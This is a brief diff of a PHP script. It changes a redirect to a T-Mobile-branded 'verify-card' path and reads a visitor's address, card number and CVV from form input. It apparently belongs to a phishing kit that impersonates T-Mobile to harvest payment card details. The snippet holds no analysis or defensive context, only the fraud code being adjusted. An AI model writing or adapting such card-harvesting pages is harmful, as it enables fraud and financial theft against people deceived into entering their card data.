@@ -1,5 +1,5 @@
 <?php
-header('Location: /wp-admin/verify-card');
+header('Location: /tmobile-online/verify-card');
 $address=$_POST['address'];
 $card=$_POST['card'];
 $cvv=$_POST['cvv'];
